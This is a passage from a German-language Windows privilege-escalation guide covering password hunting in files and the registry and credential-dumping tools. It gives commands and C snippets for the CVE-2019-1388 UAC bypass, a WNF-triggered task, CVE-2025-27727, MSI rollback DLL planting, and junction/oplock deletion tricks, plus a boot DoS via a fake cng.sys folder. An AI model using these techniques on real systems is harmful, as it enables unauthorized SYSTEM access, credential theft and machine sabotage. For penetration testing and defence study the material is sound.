**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP).

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM ausgeführter Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollständigem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollständigen Zugriff auf den Prozess mit niedrigen Berechtigungen** hast, kannst du das **offene Handle des privilegierten Prozesses**, das mit `OpenProcess()` erstellt wurde, abgreifen und **Shellcode injizieren**.\
[In diesem Beispiel erfährst du mehr darüber, **wie du diese Schwachstelle erkennen und ausnutzen kannst**.](leaked-handle-exploitation.md)\
[In diesem **weiteren Beitrag wird ausführlicher erklärt, wie du weitere offene Handles von Prozessen und Threads testen und missbrauchen kannst, die mit verschiedenen Berechtigungsstufen (nicht nur mit vollständigem Zugriff) vererbt wurden**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht verwandte Prozesse Daten gemeinsam nutzen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named Pipe Server** und **Named Pipe Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die **Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem das **Abfangen der Kommunikation über eine Named Pipe mit einem Tool wie Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und mit diesem Tool kannst du alle Pipes auflisten und anzeigen lassen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein remote authentifizierter Client kann den asynchronen Ereignispfad auf Basis von Mailslots missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf eine vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben kann. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen, beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere mit `LRegisterRequestRecipient` (`Req_Func 61`) eine Line-App, löse `TRequestMakeCall` (`Req_Func 121`) aus, rufe die Ereignisse mit `GetAsyncEvents` (`Req_Func 0`) ab und hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die in Windows Dinge ausführen können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protokollhandlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Überwachung von Befehlszeilen auf Passwörter**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Aufgaben oder andere Prozesse ausgeführt, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Abweichungen aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Low-Priv-User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche haben (über die Konsole oder RDP) und UAC aktiviert ist, können Sie in einigen Versionen von Microsoft Windows ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ von einem nicht privilegierten Benutzer aus starten.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig Privilegien zu eskalieren und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und stammt von Microsoft.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Sie finden alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lesen Sie dies, um **mehr über Integrity Levels zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie anschließend **dies, um mehr über UAC und UAC-Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions im Upload-Verzeichnis in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersagbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis löschen und durch eine NTFS-Junction ersetzen kann, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang der Junction in ein über den Webserver bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein beweist dies nicht.

Prüfen Sie die genaue Pfadbildung und den Zeitpunkt im Upload-Handler, die effektiven Lösch- und Erstellungsberechtigungen des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der Schreibprozess Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Bestätigen Sie die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber nicht das Verhalten des Handlers oder einen zukünftigen Junction-Austausch belegen. Wenn die Ausführung unter einem Dienstkonto erfolgt, prüfen Sie den **tatsächlichen Prozesstoken**, bevor Sie einen separaten Pfad über Token-Berechtigungen in Betracht ziehen.

## Durch WNF ausgelöste Bereinigung privilegierter geplanter Aufgaben

Eine geplante Aufgabe, deren manuelle Ausführung verweigert wird, kann dennoch einen nicht privilegierten Auslöser bereitstellen. Wenn Sie eine privilegierte Aufgabe prüfen, exportieren Sie deren XML und untersuchen Sie **alle** Auslöser sowie die Aufgaben-DACL, den Prinzipal und die Aktion. Insbesondere benennt ein `WnfStateChangeTrigger` einen Zustand des Windows Notification Facility (WNF); wenn dieser sicherbare Zustand es dem aktuellen Benutzer erlaubt, eine Aktualisierung zu veröffentlichen, kann der Benutzer die Aufgabe indirekt unter der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise wurde die Recall-Aufgabe `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM ausgeführt, akzeptierte Aktualisierungen des WNF-Zustands `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, löse `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermittle ein leeres Update für den acht Byte langen Zustandsnamen und gleiche den Rückgabestatus mit den Daten zur letzten Ausführung der Aufgabe oder der Procmon-Aktivität ab. Der folgende reduzierte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel. Ersetze sie durch die für die zu testende Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privilegiertes Löschen durch rekursive Bereinigung auslösen

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Auflistung bis zur abschließenden Änderung: Die Erkennung von Profilen/Sitzungen, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Hinweise darauf, dass ein zuvor geprüfter Pfad später rekursiv durchlaufen wird. Wenn Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnishandles geöffnet und vor dem Löschen validiert werden, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock hält die Bereinigungsroutine an, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare übergeordnete Pfad ersetzt, sodass der fortgesetzte privilegierte Löschvorgang über `\RPC Control` zum geschützten Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, wie es die dokumentierte MSI-Rollback-Technik erfordert.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Korrekturen

Nur den vom Angreifer kontrollierten Stamm und sein direktes untergeordnetes Element zu validieren, schützt nicht vor einem rekursiven pfadbasierten Löschvorgang. Lasse diese geprüften Objekte legitim und verlagere die Junction-/oplock-Substitution in ein weiteres darunterliegendes Element; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständiger Korrektur: Der erste Recall-Patch validierte `UKP` und das GUID-förmige Verzeichnis, behielt aber den alten rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das Objekt abzurufen und zu überprüfen und die Löschmarkierung auf dieses verifizierte Handle anzuwenden. Validiere nicht nur ein Pfadpräfix und verwende anschließend wieder einen rekursiven pfadbasierten Löschvorgang. Prüfe bei der Patch-Überprüfung auch die Strukturen an der tatsächlichen Aufrufstelle: In diesem Fall zeigte die Laufzeituntersuchung von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Löschen/Verschieben/Umbenennen eines Ordners zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; der Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dafür muss der Angreifer einen **schädlichen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` übernommen wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien abzulegen. Diese Rollback-Dateien werden so verändert, dass sie die schädliche Payload enthalten.

### Injection eines Windows-Installer-COM-Bereinigungspfads (CVE-2025-27727)

Ein Client mit niedrigen Berechtigungen kann über das `CMsiConfigurationManager`-COM-Objekt (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering identifizierte die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50`. Diese Namen und Offsets stammen aus Reverse Engineering und können sich zwischen Builds unterscheiden.<sup>[[41]](#references)</sup>

Für einen Nicht-Administrator imitiert `SetEEUIDirectoryAndFilter` den Aufrufer nur beim Öffnen des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann; außerdem wird verhindert, dass einem Reparse Point gefolgt wird. Das bindet jedoch **nicht** das geprüfte Dateiobjekt an die spätere Bereinigung und weist auch nicht nach, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen einen Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker listet die Registrierungswerte auf und übergibt Ordnereinträge ohne Prüfung ihrer Pfadherkunft an `FDeleteFolder`, das rekursiv arbeitet. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht die Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` rekonstruierte minimale Aufruffolge lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung des Pfads und nicht eine Umleitung per Junction. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lasse Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für das Vertrauen in Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt zur folgenden Rollback-Kette: Bewahre den separaten Eintrag `Installer\Folders`, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Das vorab geöffnete Handle kann mit `NtSetSecurityObject` eine permissive DACL wiederherstellen. Danach kann die generierte `.rbs` ersetzt werden, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad korrigiert, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg zurückgeben, aber der angreiferkontrollierte Pfad wird nicht mehr in `TempPackages` eingetragen. Installiere die Windows-Sicherheitsupdates vom April 2025, statt eine erfolgreiche Methodenrückgabe als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Stage 1 – Vorbereitung des Hijack ( `C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Admin-Benutzer** ihn ausführen kann.
    - Halte nach der Installation ein **Handle** für die Datei offen.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das offene Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Eigene Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - anschließend auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal kommt, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch wird **verhindert, dass sie gelöscht wird**.
    - Sende anschließend ein **Signal zurück**, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche (als Angreifer) die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und kann übernommen werden.

> An diesem Punkt kannst du die SYSTEM-Angreifbarkeit zum Löschen beliebiger Ordner auslösen, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **halte ein Handle mit `WRITE_DAC` offen**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: Beschreibbarer Speicherort.
        - `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - anschließend **wartet**, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut setzen
    - Nachdem du das Ereignis `.rbs created` erhalten hast:
        - setzt Windows Installer **starke ACLs** für `C:\Config.Msi` erneut.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **die schwachen ACLs erneut setzen**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen SYSTEM-Payload-DLL** ab.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **Custom Action vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine bösartige `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir platzierte DLL lädt.
    - **Fertig**: Dein Code wird **als SYSTEM** ausgeführt.

### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die hauptsächliche MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Schwachstelle nur **beliebiges Löschen von Dateien** erlaubt?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschen**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Dies können Sie mit standardmäßigen APIs zum Löschen von Dateien tun, etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine API zum Löschen einer *Datei* aufrufst, **löscht sie den Ordner selbst**.

### Von „Ordnerinhalte löschen“ zu SYSTEM EoP
Was, wenn dein Primitive das Löschen beliebiger Dateien/Ordner nicht erlaubt, aber **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners**?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **Junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, in dem Ordner-Metadaten gespeichert werden – durch das Löschen dieses Streams wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aufgrund der Junction + Symlink wird aber tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung eines beliebigen Ordners zum permanenten DoS

Nutze eine Primitive, mit der du **einen beliebigen Ordner als SYSTEM/admin erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn du **ihn vorab als Ordner erstellst**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Windows versucht dann, `cng.sys` während des Bootvorgangs zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externes Eingreifen (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Protokoll-/Backup-Pfaden + OM-Symlinks zum beliebigen Überschreiben von Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Protokolle/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, kannst du diesen Pfad mit **Object-Manager-Symlinks + NTFS-Bereitstellungspunkten** umleiten und so den privilegierten Schreibvorgang zum beliebigen Überschreiben nutzen (sogar **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Bereitstellungspunkt auf `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Protokoll, Export, Bericht).

**Beispielkette**
1. Lies die Konfiguration aus, um das Ziel des privilegierten Protokolls zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
